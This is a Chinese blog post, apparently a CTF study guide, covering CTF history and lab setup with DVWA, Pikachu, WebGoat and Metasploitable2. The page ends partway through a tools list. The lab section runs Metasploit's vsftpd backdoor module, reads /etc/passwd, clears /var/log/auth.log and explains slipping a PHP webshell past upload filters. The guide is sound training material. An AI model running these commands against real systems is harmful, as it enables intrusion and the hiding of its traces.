@@ -1,0 +1,4247 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一、CTF必备知识 CTF历史与发展 CTF（Capture The Flag，夺旗赛）是网络安全领域的核心竞技形式，核心是通过技术手段获取特定格式字符">
+<title>竞赛：CTF夺旗赛突击</title>
+
+<link rel='canonical' href='https://lloyal-sudo.github.io/lloyal-sudo01/p/%E7%AB%9E%E8%B5%9Bctf%E5%A4%BA%E6%97%97%E8%B5%9B%E7%AA%81%E5%87%BB/'>
+
+<link rel="stylesheet" href="/lloyal-sudo01/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="竞赛：CTF夺旗赛突击">
+<meta property='og:description' content="一、CTF必备知识 CTF历史与发展 CTF（Capture The Flag，夺旗赛）是网络安全领域的核心竞技形式，核心是通过技术手段获取特定格式字符">
+<meta property='og:url' content='https://lloyal-sudo.github.io/lloyal-sudo01/p/%E7%AB%9E%E8%B5%9Bctf%E5%A4%BA%E6%97%97%E8%B5%9B%E7%AA%81%E5%87%BB/'>
+<meta property='og:site_name' content='Loyal'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-24T18:43:58&#43;08:00'/><meta property='article:modified_time' content='2026-03-24T18:43:58&#43;08:00'/>
+<meta name="twitter:title" content="竞赛：CTF夺旗赛突击">
+<meta name="twitter:description" content="一、CTF必备知识 CTF历史与发展 CTF（Capture The Flag，夺旗赛）是网络安全领域的核心竞技形式，核心是通过技术手段获取特定格式字符">
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/lloyal-sudo01/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/lloyal-sudo01/img/avatar_hu6173231718797166606.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">👻</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/lloyal-sudo01">Loyal</a></h1>
+            <h2 class="site-description">欢迎来到我的网站！</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/lloyal-sudo01/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://lloyal-sudo.github.io/lloyal-sudo01/en/" >English</option>
+                                
+                                    <option value="https://lloyal-sudo.github.io/lloyal-sudo01/" selected>简体中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#一ctf必备知识">一、CTF必备知识</a></li>
+    <li><a href="#二解题模式">二、解题模式</a></li>
+    <li><a href="#三攻防模式">三、攻防模式</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/lloyal-sudo01/p/%E7%AB%9E%E8%B5%9Bctf%E5%A4%BA%E6%97%97%E8%B5%9B%E7%AA%81%E5%87%BB/">竞赛：CTF夺旗赛突击</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-03-24</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="一ctf必备知识">一、CTF必备知识
+</h2><ul>
+<li>CTF历史与发展<br>
+CTF（Capture The Flag，夺旗赛）是网络安全领域的核心竞技形式，核心是通过技术手段获取特定格式字符串“Flag”并提交得分。其发展历经<strong>起源萌芽、规范化、国内崛起、生态成熟</strong>四大阶段，已从极客派对演变为安全人才培养的核心阵地。<br>
+<ul>
+<li>
+<p>起源与萌芽（1996-2002）：从极客派对到规范雏形</p>
+<ul>
+<li><strong>诞生标志</strong>：1996年，美国拉斯维加斯<strong>第四届DEF CON黑客大会</strong>上，杰夫·莫斯（Jeff Moss）首次引入CTF，替代黑客间真实攻击的无序比拼，成为全球首个正式CTF赛事。</li>
+<li><strong>早期特征</strong>：无明确规则、无专业平台，手工计分；赛制为<strong>攻防对抗（Attack-Defense）</strong>，参赛队需同时攻击对手服务器、防守自身，充满即兴与实战感。</li>
+<li><strong>学术破冰</strong>：2003年，加州大学圣塔芭芭拉分校（UCSB）教授Giovanni Vigna组织<strong>iCTF</strong>，首个面向全球高校的CTF，将赛事引入学术界。</li>
+</ul>
+</li>
+<li>
+<p>规范化与国际化（2002-2012）：赛制定型与全球扩散</p>
+<ul>
+<li><strong>技术升级</strong>：2002年起，DEF CON CTF引入专业平台与自动化评分，赛事稳定性提升，成为全球标杆。</li>
+<li><strong>赛制分化</strong>：</li>
+<li><strong>解题模式（Jeopardy）</strong>：将对抗拆解为独立题目，按难度计分，门槛低，成为线上普及主流。</li>
+<li><strong>攻防模式（AWD）</strong>：保留核心对抗，规则标准化，适合线下高强度竞技。</li>
+<li><strong>全球布局</strong>：2013年全球国际性CTF超50场，赛事覆盖亚洲、欧洲、美洲，形成初步国际生态。</li>
+</ul>
+</li>
+<li>
+<p>中国崛起（2012-2020）：从追赶到领跑</p>
+<ul>
+<li><strong>国家队入场</strong>：2012年，<strong>清华蓝莲花战队</strong>首次征战DEF CON CTF资格赛，获全球第19名，成为首支入围国际顶级赛事前八的中国团队。</li>
+<li><strong>赛事繁荣</strong>：</li>
+<li>国内赛事井喷，<strong>BCTF、XCTF、TCTF</strong>等相继落地，覆盖高校与企业场景。</li>
+<li>2016年，国内记录CTF达百场，形成“高校战队+安全厂商”双轮驱动格局。</li>
+<li><strong>成绩突破</strong>：2016年，蓝莲花联合战队获DEF CON CTF亚军，创中国战队历史最佳；2017年，三支中国战队跻身DEF CON CTF前五，实现从追赶到领跑的跨越。</li>
+</ul>
+</li>
+<li>
+<p>生态成熟与前沿创新（2020至今）：全链路体系与新兴赛道</p>
+<ul>
+<li><strong>生态完善</strong>：</li>
+<li>赛事矩阵：线上（BUUCTF、攻防世界）、线下（XCTF总决赛）、国际（DEFCON、HITCON）三级体系成熟。</li>
+<li>人才培养：高校开设安全专业，战队成为校企合作桥梁，CTF成绩成为人才选拔重要标准。</li>
+<li>产业联动：安全厂商以赛事为阵地，推动技术实战化，赛事与产业形成正向循环。</li>
+<li><strong>技术拓展</strong>：题型从Web、Pwn、Reverse、Crypto、Misc五大核心，延伸至<strong>AI安全、云原生安全、IoT安全、量子安全</strong>等前沿，贴合真实威胁场景。</li>
+<li><strong>趋势特征</strong>：</li>
+<li>实战化：题目贴近真实攻防，如K8s配置漏洞、LLM提示词注入等。</li>
+<li>融合化：跨领域题目增多，如Web+密码学、取证+逆向，考验综合能力。</li>
+<li>工具化：AI成为辅助解题标配，参赛者需掌握AI辅助技术。</li>
+</ul>
+</li>
+<li>
+<p>五、核心赛事与技术版图</p>
+<ul>
+<li>
+<ol>
+<li>全球顶级赛事
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>赛事名称</th>
+<th>背景</th>
+<th>核心特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DEF CON CTF</td>
+<td>美国DEF CON黑客大会</td>
+<td>全球最高水平，“黑客世界杯”，侧重底层对抗与团队协作</td>
+</tr>
+<tr>
+<td>WCTF</td>
+<td>360Vulcan团队</td>
+<td>国际高水平对抗，聚焦前沿漏洞利用技术</td>
+</tr>
+<tr>
+<td>SECCON CTF</td>
+<td>日本</td>
+<td>高权重国际赛事，题目设计精巧，技术全面</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>国内核心赛事
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>赛事名称</th>
+<th>主办单位</th>
+<th>核心定位</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>XCTF</td>
+<td>中国网络空间安全协会</td>
+<td>高校主导，覆盖线上线下全场景</td>
+</tr>
+<tr>
+<td>TCTF</td>
+<td>腾讯安全</td>
+<td>企业主导，侧重实战化与产业对接</td>
+</tr>
+<tr>
+<td>全国大学生信息安全竞赛</td>
+<td>教育部</td>
+<td>官方权威，面向高校人才选拔</td>
+</tr>
+</tbody>
+</table></div>
+</li>
+</ol>
+</li>
+<li>
+<ol start="3">
+<li>主流技术赛道</li>
+</ol>
+<ul>
+<li><strong>Web安全</strong>：SQL注入、XSS、CSRF、文件上传、代码审计，占比最高（30%-40%）。</li>
+<li><strong>二进制漏洞利用（Pwn）</strong>：栈溢出、堆溢出、格式化字符串，考验底层内存管理能力。</li>
+<li><strong>逆向工程（RE）</strong>：分析二进制程序逻辑，破解算法与混淆，提取Flag。</li>
+<li><strong>密码学（Crypto）</strong>：古典密码、现代加密算法破解，需编程脚本辅助。</li>
+<li><strong>杂项（Misc）</strong>：隐写术、流量分析、取证、IoT固件分析，包罗万象。</li>
+</ul>
+</li>
+<li>
+<p>六、发展核心脉络总结</p>
+<ol>
+<li><strong>本质演变</strong>：从“极客游戏”→“技术竞技”→“安全人才孵化器”，价值从娱乐转向产业与教育。</li>
+<li><strong>赛制进化</strong>：从无序攻防→Jeopardy普及→AWD标准化→混合模式创新，适配不同场景。</li>
+<li><strong>技术迭代</strong>：从基础网络入侵→Web安全→二进制底层→AI/云原生前沿，紧跟技术趋势。</li>
+<li><strong>中国角色</strong>：从追赶到领跑，蓝莲花等战队推动国际影响力，国内赛事与人才体系成为全球安全生态重要支柱。</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>七、未来趋势</p>
+<ul>
+<li><strong>前沿赛道常态化</strong>：AI安全、量子安全、太空安全将成为必考题型，赛事与现实威胁深度绑定。</li>
+<li><strong>技术融合深化</strong>：单一领域题目减少，跨领域综合题增多，考验“安全+编程+系统”复合能力。</li>
+<li><strong>全球化与本土化平衡</strong>：国际赛事规则与本土教育需求结合，形成更具适应性的赛事体系。</li>
+<li><strong>工具与合规并重</strong>：AI辅助成为标配，同时强调合规伦理，推动安全人才职业化、规范化。</li>
+</ul>
+<p>CTF的发展史，是网络安全技术演进与人才培养的缩影。从1996年的第一场极客派对，到如今覆盖全球的专业竞技生态，它始终以实战为核心，成为连接技术爱好者、高校人才与产业安全需求的关键桥梁。</p>
+</li>
+</ul>
+</li>
+<li>学习CTF的意义<br>
+学习CTF（Capture The Flag）的意义，远不止于“拿奖”或“解题”，它是通往网络安全专业领域的<strong>最高效、最实战化</strong>的通途。对于处于技术入门与积累期的你来说，CTF 是一个巨大的宝藏库，其核心价值可以归纳为以下五个维度：
+<ul>
+<li>
+<ol>
+<li>构建“攻防一体”的系统化知识体系
+<strong>打破碎片化学习</strong>：纯理论学习（如看书、看课）往往是线性的、孤立的。而 CTF 是<strong>复合型</strong>的。</li>
+</ol>
+<ul>
+<li><strong>强制跨学科</strong>：一道 Web 题可能需要你掌握 Python 脚本编写（自动化解题）、Linux 命令行操作（环境搭建）、二进制基础（漏洞原理）以及网络协议原理（流量分析）。</li>
+<li><strong>知识闭环</strong>：CTF 要求你从“发现漏洞”到“利用漏洞”再到“权限维持”，形成一套完整的攻击链路。这种学习模式能强制你把所有知识点串成网，而不是散沙。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>提升“硬核”的实战动手能力（这是最核心的意义）
+<strong>对抗是检验技术的唯一标准</strong>：安全领域的核心是<strong>对抗</strong>。</li>
+</ol>
+<ul>
+<li><strong>拒绝“纸上谈兵”</strong>：相比于在虚拟机里点一下按钮，CTF 需要你亲手编写 Exploit（利用代码）、手工分析二进制程序、手工去构造 Payload。</li>
+<li><strong>排错与韧性</strong>：实战中永远充满“报错”和“失败”。从解决编译错误，到分析 SSH 连接失败，再到调试代码，这个过程极大地锻炼了你的<strong>排错能力（Troubleshooting）<strong>和</strong>抗压韧性</strong>。这正是你平时在配置环境、解决报错时反复磨练的技能。</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>铺设职业发展的“快车道”
+<strong>行业硬通货</strong>：在网络安全领域，CTF 成绩的含金量极高。</li>
+</ol>
+<ul>
+<li><strong>企业认可度</strong>：安全厂商、互联网大厂、甲方安全部门在招聘时，优先录取有 CTF 比赛经历甚至获奖的选手。因为这代表了你具备<strong>快速学习、高强度协作和解决复杂问题</strong>的能力。</li>
+<li><strong>人才敲门砖</strong>：CTF 是从“普通运维/开发”转型为“安全工程师”最直接的路径。它能帮你建立起区别于普通开发者的核心护城河。</li>
+</ul>
+</li>
+<li>
+<ol start="4">
+<li>培养“黑客思维”与创新能力
+<strong>突破常规思维</strong>：CTF 的解题思路往往不是教科书上的“标准答案”。</li>
+</ol>
+<ul>
+<li><strong>逆向思维</strong>：它要求你不仅要会“正向”构建系统，更要学会“反向”拆解系统。这种思维方式能让你在面对未知场景时，具备更强的<strong>适应性</strong>和<strong>创造力</strong>。</li>
+<li><strong>好奇心与探索欲</strong>：每一道题都是一个未知的迷宫，解开它的快感会驱动你持续探索新技术，保持对技术的热情。</li>
+</ul>
+</li>
+<li>
+<ol start="5">
+<li>低成本的“数字国防”演练
+<strong>最低风险的实战模拟</strong>：真实的渗透测试涉及法律与道德风险，而 CTF 是在合法、受控的环境下进行的实战演练。</li>
+</ol>
+<ul>
+<li>它赋予了你<strong>敬畏之心</strong>，让你在模拟攻击中深刻理解黑客是如何运作的，从而更好地进行防御。这也是你搭建靶场（DVWA、Pikachu）进行练习的根本意义所在。</li>
+</ul>
+</li>
+<li>总结：对于现在的你
+你目前正在系统性学习 Python、Linux 命令、搭建博客和靶场，这些正是 CTF 的<strong>基础底座</strong>。学习 CTF 的意义在于：<strong>把你手中的这些工具，从单纯的“配置”升级为“武器”，将你的编程能力从“写代码”提升到“造工具”和“破系统”的层级。</strong><br>
+它是一场长期的、高回报的智力投资，投资的是你的<strong>思维、视野和核心竞争力</strong>。</li>
+</ul>
+</li>
+<li>CTF靶场搭建与应用<br>
+搭建CTF/安全靶场是学习渗透测试与网络安全最核心的“练兵场”。它能让你在合法、安全的环境下，反复演练从漏洞发现到权限获取的全流程。
+<ul>
+<li>一、 核心靶场环境搭建方案
+<ul>
+<li>
+<ol>
+<li>一站式综合靶场：DVWA + Pikachu (Web安全入门首选)这是最适合入门的两个Web靶场，包含了XSS、SQL注入、文件上传等绝大多数Web漏洞原理。<br>
+<strong>流程步骤 (以Linux/Docker环境为例)</strong>：</li>
+</ol>
+<blockquote>
+<ol>
+<li><strong>安装Docker与Docker Compose</strong>
+*   这是部署靶场最快捷的方式，无需手动配置复杂的PHP/Apache/MySQL环境。<br>
+*   <strong>命令</strong>：<code>sudo apt install docker.io docker-compose -y</code></li>
+<li><strong>部署 DVWA (Damn Vulnerable Web App)</strong><br>
+*   拉取官方镜像并运行：
+<code>bash docker run --name dvwa -p 8080:80 -d vulnerables/web-dvwa </code><br>
+*   访问 <code>http://你的IP:8080</code>，按默认密码（admin/password）登录并安装数据库。</li>
+<li><strong>部署 Pikachu</strong><br>
+*   从GitHub拉取代码并启动：
+<code>bash git clone https://github.com/zhuifengshaonianhanlu/pikachu.git cd pikachu docker-compose up -d </code><br>
+*   访问 <code>http://你的IP</code> 即可使用。<br>
+<strong>应用场景</strong>：
+*   <strong>学习XSS</strong>：在DVWA的Low/Medium级别中，尝试注入JavaScript脚本，获取Cookie。<br>
+*   <strong>SQL注入</strong>：在Pikachu中练习布尔盲注、时间盲注，理解数据库是如何被一步步“掏空”的。</li>
+</ol>
+</blockquote>
+</li>
+<li>
+<ol start="2">
+<li>专业漏洞演练：WebGoat / WebWolf (OWASP官方)<br>
+由Open Web Application Security Project (OWASP) 推出，包含了更全面、更现代化的Web漏洞练习，如JWT漏洞、SSRF等。
+<strong>流程</strong>：</li>
+</ol>
+<blockquote>
+<ol>
+<li>下载官方Docker镜像：<code>docker pull webgoat/webgoat-8.0</code></li>
+<li>运行：<code>docker run -p 8080:8080 -p 8081:8081 -t webgoat/webgoat-8.0</code></li>
+<li>访问 <code>http://你的IP:8080/WebGoat</code> 开始学习。</li>
+</ol>
+</blockquote>
+</li>
+<li>
+<ol start="3">
+<li>渗透测试实战：Metasploitable2 (系统漏洞演练)
+这是一个 intentionally made vulnerable 的虚拟机，系统本身存在大量高危漏洞（如Vsftpd反弹Shell、MySQL弱口令），适合练习<strong>漏洞扫描与远程溢出</strong>。<br>
+<strong>流程</strong>：</li>
+</ol>
+<blockquote>
+<ol>
+<li>从官方网站下载OVA镜像文件。</li>
+<li>在VMware/VirtualBox中导入并开机。</li>
+<li>获取IP地址：<code>ifconfig</code> (通常用户名/密码为 <code>msfadmin</code>/<code>msfadmin</code>)。</li>
+<li>使用Kali Linux的Metasploit框架进行攻击：
+*   搜索模块：<code>search vsftpd</code>
+*   加载模块：<code>use exploit/unix/ftp/vsftpd_234_backdoor</code>
+*   设置目标：<code>set RHOST 靶场IP</code>
+*   执行攻击：<code>run</code></li>
+</ol>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>二、 靶场的高级应用与实战流程
+搭建好靶场后，核心在于如何<strong>系统性地使用</strong>它。以下是一个标准的安全测试闭环：
+<ul>
+<li>
+<ol>
+<li>信息收集 (Reconnaissance)</li>
+</ol>
+<ul>
+<li><strong>目标</strong>：摸清靶场的“家底”。</li>
+<li><strong>工具</strong>：
+<ul>
+<li><strong>Nmap (端口扫描)</strong>：<code>nmap -sV 靶场IP</code> 查看开放端口和服务版本。</li>
+<li><strong>Dirsearch (目录扫描)</strong>：<code>python3 dirsearch.py -u http://靶场IP</code> 发现隐藏的后台目录。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li>漏洞探测 (Vulnerability Scanning)</li>
+</ol>
+<ul>
+<li><strong>目标</strong>：利用工具或手工，寻找可利用的安全缺陷。</li>
+<li><strong>操作</strong>：
+<ul>
+<li><strong>自动化</strong>：使用OpenVAS或Nessus进行全端口漏洞扫描。</li>
+<li><strong>手工</strong>：结合你学的Python脚本，自动化发送请求，分析响应包中的差异（这正是你学习Requests库的绝佳用途）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li>漏洞利用 (Exploitation)</li>
+</ol>
+<ul>
+<li><strong>目标</strong>：获取目标服务器的权限。</li>
+<li><strong>操作</strong>：
+<ul>
+<li><strong>Web漏洞</strong>：在DVWA中，利用SQL注入获取数据库用户名和密码。</li>
+<li><strong>系统漏洞</strong>：在Metasploitable中，利用Vsftpd漏洞获取root权限。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<ol start="4">
+<li>后渗透测试 (Post-Exploitation)</li>
+</ol>
+<ul>
+<li><strong>目标</strong>：维持权限，横向移动，清理痕迹。</li>
+<li><strong>操作</strong>：
+<ul>
+<li>上传提权工具，获取更高权限。</li>
+<li>查看敏感文件（如 <code>/etc/passwd</code>）。</li>
+<li>清理日志：<code>echo &quot;&quot; &gt; /var/log/auth.log</code> (模拟攻击者行为)。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>三、 避坑指南与常见问题解决
+<ul>
+<li>
+<ol>
+<li><strong>网络互通问题</strong></li>
+</ol>
+<ul>
+<li><strong>现象</strong>：Kali虚拟机无法Ping通靶场虚拟机。</li>
+<li><strong>解决</strong>：确保两台虚拟机的网络模式均为 <strong>Host-Only</strong> 或 <strong>NAT模</strong>，并检查防火墙状态。</li>
+</ul>
+</li>
+<li>
+<ol start="2">
+<li><strong>文件上传失败</strong></li>
+</ol>
+<ul>
+<li><strong>现象</strong>：在Web靶场上传PHP一句话木马被拦截。</li>
+<li><strong>解决</strong>：这是WAF（Web应用防火墙）或服务器配置在起作用。你需要在靶场<strong>关闭WAF</strong>，或尝试修改文件后缀（如 <code>php</code> -&gt; <code>php5</code>）、利用文件包含漏来绕过。</li>
+</ul>
+</li>
+<li>
+<ol start="3">
+<li><strong>权限不足</strong></li>
+</ol>
+<ul>
+<li><strong>现象</strong>：执行命令时提示 <code>Permission denied</code>。</li>
+<li><strong>解决</strong>：Linux环境下，熟练使用 <code>sudo</code> 命令切换用户，或练习SUID权、Linux内核漏洞提权等进阶技巧。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CTF工具介绍与使用<br>
+在CTF与网络安全学习中，“工欲善其事，必先利其器”。
+<ul>
+<li>
+<p>一、 信息收集与扫描 (Recon &amp; Scanning)<br>
+这是第一步，目的是摸清目标“家底”，发现开放端口和潜在漏洞。</p>
+<ul>
+<li>
